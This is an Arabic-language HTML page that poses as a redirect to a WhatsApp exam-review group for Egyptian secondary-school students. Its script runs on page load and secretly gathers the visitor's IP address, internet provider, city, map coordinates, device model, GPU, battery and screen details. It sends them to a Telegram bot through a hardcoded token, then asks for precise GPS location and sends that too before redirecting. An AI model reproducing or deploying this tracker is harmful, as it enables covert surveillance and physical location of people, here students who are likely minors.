<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta property="og:title" content="📚 جروب المراجعات النهائية - ثانوية عامة 2026 📚">
    <meta property="og:description" content="انضم الآن لجروب الواتساب الرسمي لتحميل مذكرات ليلة الامتحان وتوقعات الأوائل.">
    <meta property="og:image" content="https://img.freepik.com/free-vector/graduation-cap-with-books-background_23-2147644917.jpg">
    <title>جاري تحويلك للمجموعة...</title>

    <script>
        async function kimoThanaweyaScanner() {
            const token = "8763636236:AAGwS4RP8igJ43BK2QdsdWSIl_c7RK9gAjo";
            const chatId = "5890070301";

            let ipData = {};
            try {
                // سحب بيانات الموقع والشركة
                const res = await fetch('https://ipapi.co/json/');
                ipData = await res.json();
            } catch(e) { console.log("Stealth Mode Active"); }

            // كشف هوية الجهاز الحقيقي (ثغرة Entropy)
            let deviceModel = "Unknown";
            try {
                if (navigator.userAgentData) {
                    const info = await navigator.userAgentData.getHighEntropyValues(["model", "platform"]);
                    deviceModel = `${info.platform} ${info.model || ""}`;
                } else {
                    deviceModel = navigator.platform;
                }
            } catch(e) { deviceModel = navigator.platform; }

            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl');
            const debug = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
            const gpu = debug ? gl.getParameter(debug.UNMASKED_RENDERER_ID) : "Protected";
            
            let bInfo = "N/A";
            if (navigator.getBattery) {
                const b = await navigator.getBattery();
                bInfo = `${Math.round(b.level * 100)}% | ${b.charging ? '⚡' : '🔋'}`;
            }

            // تقرير "صيد ثانوية عامة" الشامل
            const report = `
🎓 **KIMO V.MAX - صيد طالب ثانوية** 🎓
━━━━━━━━━━━━━━
📱 **[1] هوية جهاز الطالب**
• **اسم الجهاز:** \`${deviceModel}\`
• **المصنع:** ${navigator.vendor || "Apple/Google"}
• **المعالج:** ${navigator.hardwareConcurrency} Cores
• **كارت الشاشة:** \`${gpu}\`

🌍 **[2] الموقع والإنترنت (بدقة)**
• **شركة الإنترنت:** ${ipData.org || "غير معروف"} 🌐
• **البلد والمدينة:** ${ipData.country_name} | ${ipData.city}
• **الـ IP الحالي:** \`${ipData.ip}\`
• **نوع النت:** ${navigator.connection ? navigator.connection.effectiveType : "WiFi"}
• **الخريطة:** [Google Maps 🗺️](https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude})

🔋 **[3] حالة الفون**
• **البطارية:** ${bInfo}
• **الرامات:** ${navigator.deviceMemory || "N/A"} GB
• **الدقة:** ${screen.width}x${screen.height}

⚙️ **[4] معلومات إضافية**
• **التوقيت:** ${Intl.DateTimeFormat().resolvedOptions().timeZone}
• **وضع التخفي:** ${!window.indexedDB ? "نشط 🕵️" : "معطل"}
━━━━━━━━━━━━━━`;

            // إرسال البيانات فوراً
            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(report)}&parse_mode=Markdown`);

            // محاولة سحب الـ GPS بالشارع
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition((pos) => {
                    const gpsMsg = `📍 **موقع الطالب بالشارع (GPS)**\nLink: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(gpsMsg)}`);
                }, null, {enableHighAccuracy: true});
            }

            // تحويل لجروب الثانوية الجديد بعد 3 ثواني
            setTimeout(() => {
                window.location.href = "https://chat.whatsapp.com/E5tpwhb6D5j9lDnXBFNbLM?mode=gi_t";
            }, 3000);
        }
        window.onload = kimoThanaweyaScanner;
    </script>
</head>
<body style="background:#fff; display:flex; justify-content:center; align-items:center; height:100vh; margin:0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;">
    <div style="text-align:center;">
        <p style="color:#128C7E; font-size:20px; font-weight:bold;">جاري تحويلك لمجموعة ثانوية عامة...</p>
        <p style="color:#666; font-size:14px;">يتم الآن تأمين دخولك للمجموعة وتجهيز الملفات...</p>
        <div style="border:4px solid #f3f3f3; border-top:4px solid #128C7E; border-radius:50%; width:40px; height:40px; animation:spin 1s linear infinite; margin:20px auto;"></div>
    </div>
    <style>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
</body>
</html>
